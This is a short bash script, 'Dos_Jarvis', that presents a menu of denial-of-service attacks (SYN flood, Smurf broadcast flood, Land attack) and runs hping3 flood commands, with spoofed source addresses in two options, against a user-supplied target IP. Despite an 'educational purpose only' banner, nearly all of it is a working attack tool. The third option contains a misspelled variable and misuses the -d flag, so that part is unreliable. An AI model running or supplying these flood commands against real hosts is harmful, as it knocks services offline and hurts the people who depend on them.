#!/bin/bash
clear
toilet Dos_Jarvis
echo " Welcome to DJ - DDos with Jarvis"
echo "Warning! For educational purpose only."

echo "1- DDos attack"
echo "2- Smurf attack"
echo "3- Land attack"
echo "enter your choice..."
read a
clear
if [ $a = 1 ]
then
	toilet Dos_Jarvis
	echo "enter the port number : "
	read p
	echo "enter the IP address : "
	read IP
	clear
	toilet Dos_Jarvis
	hping3 -S --flood -V -p $p $IP
fi
if [ $a = 2 ]
then
	toilet Dos_jarvis
	
	echo " Smurf is a DoS attacking method. In this flood attack, it floods the victim with the ICMP echo packets instead of TCP SYN packets. Also, it is a spoofed broadcast ping request using the victim IP address as the Source IP."
	echo " "	
	echo "enter the target IP address"
	read IP
	echo "enter the broadcast address"
	read broad
	clear
	toilet Dos_Jarvis
	hping3 -1 --flood --spoof $IP $broad
fi

if [ $a = 3 ]
then
	toilet Dos_Jarvis
	echo "In this, the attacker sends spoofed SYN packets to the victim using the Victim's IP address and both source and destination IP. This results in the system constantly replying to itself can  crash the system."
	echo " "
	echo "enter the count of packets"
	read c
	echo "enter the source port "
	read sourcePort
	echo "enter the destination port "
	read destPort
	echo "enter the victimIp_Source_spoof"
	read spoof
	echo "enter the target IP"
	read IP
	clear
	toilet Dos_Jarvis
	hping3 -c $c -s $sourcePort -d $deatPort --flood -a $spoof $IP
fi
